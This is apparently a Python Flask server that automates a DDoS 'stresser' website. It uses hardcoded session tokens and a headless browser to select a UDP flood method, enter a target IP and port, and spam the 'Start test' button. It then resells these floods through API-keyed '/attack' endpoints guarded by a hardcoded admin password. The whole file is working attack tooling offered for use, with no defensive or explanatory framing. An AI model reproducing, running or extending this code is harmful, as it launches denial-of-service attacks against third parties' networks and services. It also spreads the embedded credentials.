from flask import Flask, jsonify, request
from flask_cors import CORS
from cloakbrowser import launch
import time
import threading
import json
import os
import secrets
import string
from datetime import datetime
import queue

app = Flask(__name__)
CORS(app)

# ========== CONFIG ==========
METHOD         = "UDP-BIG"
ADMIN_PASSWORD = "krishna"
PORT           = 3938
MAX_PRELOADED  = 6                    # ⚡ 6 TOKENS = 6 WORKERS
API_NAME       = "krishna father of STTRSERRR"

# ⚡ SPEED SETTINGS
CLICK_DELAY    = 0.008               # 125 clicks/sec (fast)
SCREENSHOT_AT  = 1                   # Screenshot at 1s
CLICK_REPORT   = 500                 # Report every 500 clicks
BROWSER_LAUNCH_TIMEOUT = 60
PAGE_LOAD_TIMEOUT = 60
SELECT_RETRY_MAX = 3
SELECT_RETRY_WAIT = 1

# ========== SESSIONS (6 TOKENS) ==========
SESSIONS_DATA = [
    {"session_number": 1, "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
    {"session_number": 2, "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
    {"session_number": 3, "access_key": "08e90b3fa69743d3968a0023c204fda3b412c1af6c4149b8ba58c965d854fa40"},
    {"session_number": 4, "access_key": "7cc7b120d6d147b7a9e8c92dcec7dd9763c1caa6caee416c8690b552e55b1afb"},
    {"session_number": 5, "access_key": "376fa93fe3f147fbb9a828fbcfcef7c00f0cc04bc357406ab576dcb4b98fe413"},
    {"session_number": 6, "access_key": "cb8e5fc461194fc783ea7dd579bab6a3ef58f09a1c9c475d96759687e92af403"}
]

# ========== GLOBALS ==========
sessions             = []
sessions_lock        = threading.Lock()
active_attacks       = 0
api_keys             = {}
api_keys_file        = "api_keys.json"
attack_queue         = queue.Queue()
worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()
attack_counter       = 0
attack_counter_lock  = threading.Lock()
session_index        = 0
session_index_lock   = threading.Lock()
SS_FOLDER = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)


# ========== STORAGE ==========
def load_api_keys():
    global api_keys
    try:
        if os.path.exists(api_keys_file):
            with open(api_keys_file) as f:
                api_keys = json.load(f)
            print(f"API Keys loaded: {len(api_keys)}")
        else:
            api_keys = {}
    except Exception as e:
        print(f"API keys load error: {e}")
        api_keys = {}


def save_api_keys():
    try:
        with open(api_keys_file, "w") as f:
            json.dump(api_keys, f, indent=2)
    except Exception as e:
        print(f"API keys save error: {e}")


def load_sessions():
    global sessions
    print("Loading sessions...")
    for entry in SESSIONS_DATA:
        sn = entry["session_number"]
        token = entry["access_key"]
        cookies = [{
            "name": "auth_token",
            "value": token,
            "domain": "retrostress.net",
            "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True,
            "secure": True,
            "sameSite": "Lax"
        }]
        sessions.append({"id": sn, "cookies": cookies})
        print(f"Session {sn} loaded | token={token[:20]}...")
    print(f"Total sessions: {len(sessions)}")
    return len(sessions) > 0


def get_next_session():
    global session_index
    with session_index_lock:
        s = sessions[session_index % len(sessions)]
        session_index += 1
        return s


def get_total_slots():
    return len(sessions)


def get_used_slots():
    return sum(k.get("slots", 0) for k in api_keys.values() if k.get("active"))


def get_available_slots():
    return get_total_slots() - get_used_slots()


def generate_api_key():
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))


def check_password(req):
    return (req.args.get("password") or req.headers.get("X-Password")) == ADMIN_PASSWORD


# ========== SCREENSHOT ==========
def take_screenshot(page, name, full_page=False):    # ⚡ full_page=False = faster
    try:
        path = os.path.join(SS_FOLDER, name)
        page.screenshot(path=path, full_page=full_page)
        print(f"SS: {name}")
        return path
    except Exception as e:
        print(f"SS fail: {e}")
        return None


def get_attack_ss_name(n):
    return f"atk{str(n).zfill(4)}.png"


# ========== WORKER ==========
def worker_thread(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser = None
    page = None
    loading_decreased = False
    session = get_next_session()
    session_id = session["id"]

    try:
        print(f"[W-{worker_number}] Session {session_id} | Opening...")
        browser = launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 1280, "height": 720})  # ⚡ smaller = faster
        page.context.add_cookies(session["cookies"])

        # ⚡ FASTER PAGE LOAD
        try:
            page.goto("https://retrostress.net/panel",
                      wait_until="domcontentloaded",
                      timeout=PAGE_LOAD_TIMEOUT * 1000)
        except Exception as e:
            print(f"[W-{worker_number}] Goto error: {e}")
            return

        time.sleep(2.5)  # ⚡ reduced from 4 to 2.5

        if "auth" in page.url or "login" in page.url:
            print(f"[W-{worker_number}] Session expired!")
            return

        print(f"[W-{worker_number}] Panel: {page.url}")

        method_selected = False
        for retry in range(SELECT_RETRY_MAX):
            try:
                # STEP 1: Layer 4
                clicked = page.evaluate("""
                    () => {
                        const btns = document.querySelectorAll('button');
                        for (const b of btns) {
                            const t = b.innerText || b.textContent || '';
                            if (t.includes('Network endpoint') || t.includes('Layer 4')) {
                                b.click(); return true;
                            }
                        }
                        return false;
                    }
                """)
                if not clicked:
                    raise Exception("Layer 4 not found")
                time.sleep(0.4)  # ⚡ reduced

                # STEP 2: Browse
                clicked = page.evaluate("""
                    () => {
                        const span = document.querySelector('span.app-method-trigger-action');
                        if (span) { span.click(); return true; }
                        const sp = document.querySelectorAll('span');
                        for (const s of sp) {
                            if (s.innerText && s.innerText.includes('Browse methods')) {
                                s.click(); return true;
                            }
                        }
                        return false;
                    }
                """)
                if not clicked:
                    raise Exception("Browse not found")
                time.sleep(0.8)  # ⚡ reduced

                # STEP 3: UDP
                clicked = page.evaluate("""
                    () => {
                        const btns = document.querySelectorAll('button');
                        for (const b of btns) {
                            const t = (b.innerText || b.textContent || '').trim();
                            if (t === 'UDP') { b.click(); return true; }
                        }
                        return false;
                    }
                """)
                if not clicked:
                    raise Exception("UDP not found")
                time.sleep(0.4)

                # STEP 4: UDP-BIG
                clicked = page.evaluate("""
                    () => {
                        const opts = document.querySelectorAll('button[role="option"]');
                        for (const o of opts) {
                            const s = o.querySelector('strong');
                            if (s && s.textContent.trim() === 'UDP-BIG') {
                                o.click(); return true;
                            }
                        }
                        const btns = document.querySelectorAll('button');
                        for (const b of btns) {
                            const s = b.querySelector('strong');
                            if (s && s.textContent.trim() === 'UDP-BIG') {
                                b.click(); return true;
                            }
                        }
                        return false;
                    }
                """)
                if not clicked:
                    raise Exception("UDP-BIG not found")
                time.sleep(0.3)

                method_selected = True
                break
            except Exception as e:
                print(f"[W-{worker_number}] Retry {retry+1}: {e}")
                try: page.keyboard.press('Escape')
                except: pass
                time.sleep(SELECT_RETRY_WAIT)
                if retry == SELECT_RETRY_MAX - 1:
                    return

        if not method_selected:
            return

        print(f"[W-{worker_number}] Ready!")

        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
                loading_decreased = True

        with worker_pool_lock:
            if len(worker_pool) >= MAX_PRELOADED:
                return
            worker_pool.append(worker_number)
            pool_size = len(worker_pool)

        print(f"[W-{worker_number}] Pool: {pool_size}/{MAX_PRELOADED}")

        job = attack_queue.get(block=True)

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        target_ip = job["ip"]
        port = job["port"]
        duration = job["duration"]
        attack_id = job["attack_id"]

        with attack_counter_lock:
            attack_counter += 1
            atk_num = attack_counter

        ss_name = get_attack_ss_name(atk_num)
        print(f"[W-{worker_number}] ATK-{atk_num} | {target_ip}:{port} | {duration}s")

        # ⚡ FAST FILL IP
        page.evaluate(f"""
            () => {{
                const el = document.querySelector('input#test-url');
                if (el) {{
                    el.value = '{target_ip}';
                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                }}
            }}
        """)

        # ⚡ FAST FILL PORT
        page.evaluate(f"""
            () => {{
                const el = document.querySelector('input[aria-label="port"]');
                if (el) {{
                    el.value = '{port}';
                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                }}
            }}
        """)

        attack_button = page.locator('button.button.primary:has-text("Start test")')
        spam_duration = max(duration - 1, 1)
        start_time = time.time()
        click_count = 0
        ss_taken = False

        print(f"[W-{worker_number}] 🚀 SPAM START (target: 125 clicks/s)")

        while time.time() - start_time < spam_duration:
            try:
                attack_button.click(force=True, no_wait_after=True)
                click_count += 1

                if not ss_taken and time.time() - start_time >= SCREENSHOT_AT:
                    take_screenshot(page, ss_name)
                    ss_taken = True

                if click_count % CLICK_REPORT == 0:
                    elapsed = int(time.time() - start_time)
                    remaining = int(spam_duration - elapsed)
                    cps = int(click_count / max(elapsed, 1))
                    print(f"[W-{worker_number}] ⚡ {click_count} clicks | {cps}/s | {remaining}s left")

                time.sleep(CLICK_DELAY)  # ⚡ 0.008 = 125/s

            except Exception as click_err:
                time.sleep(CLICK_DELAY)
                continue

        total_time = time.time() - start_time
        cps = int(click_count / max(total_time, 1))
        print(f"[W-{worker_number}] ✅ DONE! {click_count} clicks | {cps}/s avg")

    except Exception as e:
        print(f"[W-{worker_number}] Error: {e}")
    finally:
        if browser:
            try:
                browser.close()
            except:
                pass

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        if not loading_decreased:
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1

        with sessions_lock:
            active_attacks -= 1

        print(f"[W-{worker_number}] Released!")


# ========== POOL MANAGER ==========
worker_counter = 0
worker_counter_lock = threading.Lock()


def pool_manager():
    global workers_loading, worker_counter
    while True:
        try:
            with worker_pool_lock:
                pool_size = len(worker_pool)
            with workers_loading_lock:
                loading = workers_loading
            needed = MAX_PRELOADED - (pool_size + loading)

            if needed > 0:
                print(f"[Pool] Ready: {pool_size} | Loading: {loading} | Need: {needed}")
                for i in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        wn = worker_counter
                    threading.Thread(target=worker_thread, args=(wn,), daemon=True).start()
                    time.sleep(0.3)   # ⚡ faster spawn
        except Exception as e:
            print(f"[Pool] Error: {e}")
        time.sleep(3)


# ========== ROUTES ==========
@app.route("/admin/generate_key", methods=["GET"])
def generate_key():
    if not check_password(request):
        return jsonify({"status": "error", "message": "Wrong pwd!"}), 403
    try:
        slots = int(request.args.get("slots", 1))
    except:
        slots = 1
    if slots < 1:
        return jsonify({"status": "error", "message": "Min 1 slot!"}), 400
    if slots > get_available_slots():
        return jsonify({"status": "error", "available": get_available_slots()}), 400
    k = generate_api_key()
    api_keys[k] = {
        "slots": slots,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "active": True
    }
    save_api_keys()
    return jsonify({
        "status": "success",
        "api_key": k,
        "slots": slots,
        "api_name": API_NAME
    })


@app.route("/admin/list_keys", methods=["GET"])
def list_keys():
    if not check_password(request):
        return jsonify({"status": "error"}), 403
    return jsonify({
        "status": "success",
        "keys": list(api_keys.keys()),
        "api_name": API_NAME
    })


@app.route("/attack/<ip>/<int:port>/<int:time_sec>", methods=["GET"])
def attack_url(ip, port, time_sec):
    global active_attacks
    k = request.args.get("key") or request.headers.get("X-API-Key")
    if not k or k not in api_keys or not api_keys[k]["active"]:
        return jsonify({"status": "error", "message": "Invalid Key"}), 403
    if time_sec > 300 or time_sec < 1:
        return jsonify({"status": "error", "message": "Duration 1-300s"}), 400

    with worker_pool_lock:
        pool_size = len(worker_pool)

    if pool_size == 0:
        return jsonify({"status": "error", "message": "No workers ready"}), 429

    with sessions_lock:
        active_attacks += 1
        aid = active_attacks

    attack_queue.put({
        "ip": ip,
        "port": port,
        "duration": time_sec,
        "attack_id": aid
    })

    return jsonify({
        "status": "success",
        "message": "Launched!",
        "api_name": API_NAME,
        "attack_id": aid,
        "target": f"{ip}:{port}",
        "duration": f"{time_sec}s",
        "pool_ready": pool_size,
        "active_attacks": active_attacks
    })


@app.route("/attack", methods=["GET"])
def attack_query():
    ip = request.args.get("ip")
    port = request.args.get("port", 80)
    time_sec = request.args.get("time", 60)
    if not ip:
        return jsonify({"status": "error", "message": "IP required"}), 400
    return attack_url(ip, int(port), int(time_sec))


@app.route("/status", methods=["GET"])
def status():
    with worker_pool_lock:
        pool_size = len(worker_pool)
    with workers_loading_lock:
        loading = workers_loading
    try:
        ss_count = len(os.listdir(SS_FOLDER))
    except:
        ss_count = 0
    return jsonify({
        "status": "Online",
        "api_name": API_NAME,
        "pool_ready": pool_size,
        "pool_loading": loading,
        "max_pool": MAX_PRELOADED,
        "active_attacks": active_attacks,
        "screenshots": ss_count,
        "sessions": len(sessions),
        "speed": "FAST",
        "click_delay": CLICK_DELAY
    })


@app.route("/screenshots", methods=["GET"])
def list_screenshots():
    try:
        files = sorted(os.listdir(SS_FOLDER))
        return jsonify({"total": len(files), "files": files})
    except:
        return jsonify({"error": "Failed"}), 500


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "Online",
        "api_name": API_NAME,
        "port": PORT,
        "sessions": len(sessions)
    })


# ========== MAIN ==========
if __name__ == "__main__":
    print("=" * 60)
    print(API_NAME)
    print("=" * 60)
    load_api_keys()
    if not load_sessions():
        print("No sessions!")
        exit(1)
    print(f"Sessions:     {len(sessions)}")
    print(f"Workers:      {MAX_PRELOADED}")
    print(f"Method:       {METHOD}")
    print(f"Speed:        FAST ({int(1/CLICK_DELAY)}/s)")
    print(f"Pwd:          {ADMIN_PASSWORD}")
    print(f"Port:         {PORT}")
    print("=" * 60)
    threading.Thread(target=pool_manager, daemon=True).start()
    print(f"Loading {MAX_PRELOADED} workers...")
    timeout = 240
    start = time.time()
    while time.time() - start < timeout:
        with worker_pool_lock:
            ready = len(worker_pool)
        with workers_loading_lock:
            loading = workers_loading
        if ready >= MAX_PRELOADED:
            break
        print(f"  Ready: {ready}/{MAX_PRELOADED} | Loading: {loading}")
        time.sleep(3)
    print(f"\nReady: {len(worker_pool)}/{MAX_PRELOADED}")
    print(f"Port:  {PORT}")
    print(f"Pwd:   {ADMIN_PASSWORD}")
    print(f"Speed: FAST MODE")
    print("=" * 60)
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)